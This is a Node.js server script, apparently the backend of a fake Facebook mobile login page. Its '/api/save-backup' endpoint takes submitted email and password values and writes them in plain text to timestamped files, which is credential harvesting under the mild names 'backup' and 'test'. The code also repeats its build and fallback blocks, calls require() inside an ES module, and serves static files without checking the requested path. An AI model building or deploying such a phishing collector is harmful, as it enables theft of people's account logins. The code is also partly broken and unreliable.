import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

const PORT = process.env.PORT || 5173;
const BASE_DIR = process.cwd();
const DIST_DIR = path.join(BASE_DIR, 'dist');
const SAVED_DIR = path.join(BASE_DIR, 'saved');

// Build dist/ if it doesn't exist (make it work standalone)
if (!fs.existsSync(DIST_DIR)) {
  try {
    console.log('dist/ not found. Running build...');
    const { execSync } = require('child_process');
    execSync('npm run build', { stdio: 'inherit' });
  } catch (err) {
    console.error('Build failed:', err.message);
  }
}

// If dist/ still doesn't exist, create a minimal index.html
if (!fs.existsSync(DIST_DIR)) {
  fs.mkdirSync(DIST_DIR, { recursive: true });
  fs.writeFileSync(path.join(DIST_DIR, 'index.html'), '<html><body><h1>Facebook Login Test</h1><p>Server is running. Check the API endpoint.</p></body></html>', 'utf-8');
  console.log('Created minimal index.html in dist/');
}

// Build dist/ if it doesn't exist (make it work standalone)
if (!fs.existsSync(DIST_DIR)) {
  try {
    console.log('dist/ not found. Running build...');
    const { execSync } = require('child_process');
    execSync('npm run build', { stdio: 'inherit' });
  } catch (err) {
    console.error('Build failed:', err.message);
  }
}

// If dist/ still doesn't exist, create a minimal index.html
if (!fs.existsSync(DIST_DIR)) {
  fs.mkdirSync(DIST_DIR, { recursive: true });
  fs.writeFileSync(path.join(DIST_DIR, 'index.html'), '<html><body><h1>Facebook Login Test</h1><p>Server is running. Check the API endpoint.</p></body></html>', 'utf-8');
  console.log('Created minimal index.html in dist/');
}

// Ensure the saved directory exists
if (!fs.existsSync(SAVED_DIR)) {
  fs.mkdirSync(SAVED_DIR, { recursive: true });
}

const server = http.createServer((req, res) => {
  console.log(`[API] ${req.method} ${req.url}`);
  // Prevent orphaned keep-alive sockets from blocking
  req.on('error', () => {});
  res.on('error', () => {});
  // Handle the save backup API
  if (req.method === 'POST' && req.url === '/api/save-backup') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `facebook_mobile_login_backup_${timestamp}.txt`;
        const filePath = path.join(SAVED_DIR, fileName);

        const fileContent = `Facebook Mobile Login Backup\n` +
          `Timestamp: ${data.timestamp}\n` +
          `Email: ${data.email || '(empty)'}\n` +
          `Password: ${data.password || '(empty)'}\n`;

        fs.writeFileSync(filePath, fileContent, 'utf-8');

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, file: fileName }));
      } catch (err) {
        console.error('Failed to save backup:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Failed to save backup' }));
      }
    });

    return;
  }

  // Serve static files
  let filePath = path.join(DIST_DIR, req.url === '/' ? 'index.html' : req.url);
  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404);
      res.end('Not found');
      return;
    }

    const ext = path.extname(filePath);
    const mimeTypes = {
      '.html': 'text/html',
      '.js': 'text/javascript',
      '.css': 'text/css',
      '.json': 'application/json',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.svg': 'image/svg+xml',
      '.ico': 'image/x-icon',
      '.woff': 'font/woff',
      '.woff2': 'font/woff2',
      '.ttf': 'font/ttf'
    };

    res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' });
    res.end(content);
  });
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Backups saved to: ${SAVED_DIR}`);
  console.log(`Serving from: ${DIST_DIR}`);
});

// Log server errors
server.on('error', (err) => {
  console.error('Server error:', err.message);
  console.error(err.stack);
  process.exit(1);
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
  console.error(err.stack);
  process.exit(1);
});

// Handle unhandled rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  process.exit(1);
});
